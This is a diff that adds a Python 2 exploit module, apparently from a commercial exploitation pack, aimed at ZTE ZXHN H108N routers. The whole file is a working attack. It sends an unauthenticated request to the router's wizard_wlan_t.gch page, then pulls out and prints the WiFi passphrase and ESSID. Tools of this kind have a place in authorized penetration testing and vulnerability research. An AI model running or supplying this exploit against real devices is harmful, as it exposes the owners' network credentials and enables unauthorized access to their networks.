@@ -1,0 +1,54 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+_name_   = 'd2sec_zte_3'
+_vendor_ = 'zte'
+_model_  = ['ZXHN H108N']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://github.com/threat9/routersploit/issues/588'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'https://%s:%d/wizard_wlan_t.gch' % (host,port)    
+    response = requests.get(url, verify=False)                    
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return
+  if 'KeyPassphrase' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('Transfer_meaning\(\'KeyPassphrase\',\'([^\']+)\'\)', response.text)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text        
+    else:           
+      print 'WiFi password: %s'%m.group(1)
+      m = re.search('Transfer_meaning\(\'ESSID\',\'([^\']+)\'\)', response.text)
+      if m is not None:
+        print 'WiFi ESSID: %s\n'%m.group(1)
+       
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
